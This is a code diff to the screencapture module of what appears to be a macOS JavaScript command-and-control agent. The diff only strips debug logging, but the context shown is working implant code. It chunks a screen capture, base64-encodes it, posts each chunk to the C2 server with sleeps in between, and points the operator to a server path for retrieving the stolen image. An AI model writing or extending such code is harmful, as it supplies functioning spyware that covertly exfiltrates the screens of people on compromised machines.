@@ -34,26 +34,21 @@ exports.screencapture = function(task, command, params){
     var registerFile = C2.postResponse(task, registerData);
     if (registerFile['status'] == "success"){
         var currentChunk = 1;
-        console.log("Capture length: " + capture.length);
         var data = capture.substring(offset, chunkSize);//handle.readDataOfLength(chunkSize);
         data = convert_to_nsdata(data);
         while(parseInt(data.length) > 0 && offset < fileSize){
             // send a chunk
             var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
             fileData = convert_to_nsdata(fileData);
-            console.log("Final posting size: " + fileData.length);
             C2.postResponse(task, fileData);
             $.NSThread.sleepForTimeInterval(C2.getInterval());
 
             // increment the offset and seek to the amount of data read from the file
-            console.log("in loop, offset: " + offset);
             offset = offset + parseInt(data.length);
-            console.log("in loop, offset after add: " + offset);
             //handle.seekToFileOffset(offset);
             currentChunk += 1;
             var data = capture.substring(offset, chunkSize + offset);//data = handle.readDataOfLength(chunkSize);
             data = convert_to_nsdata(data);
-            console.log("at end of loop, data length: " + parseInt(data.length) + ", offset: " + offset + ", filesize: " + fileSize);
         }
         var output = "Finished downloading file with id: " + registerFile['file_id'];
         output += "\nBrowse to /api/v1.0/files/" + registerFile['file_id'] + " and base64 decode it";
